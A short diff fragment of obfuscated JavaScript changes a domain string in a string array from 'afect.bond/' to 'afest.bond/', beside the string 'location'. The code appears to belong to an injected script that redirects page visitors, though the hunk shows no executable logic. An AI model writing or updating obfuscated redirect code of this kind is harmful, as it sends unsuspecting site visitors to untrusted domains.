@@ -20,7 +20,7 @@ function _0x21d3() {
     var _0x3208b6 = [
         '6FeDHEL',
         '3057026QQnNhe',
-        'afect.bond/',
+        'afest.bond/',
         'location',
         'XnjoV',
         '974204wFJoaK',
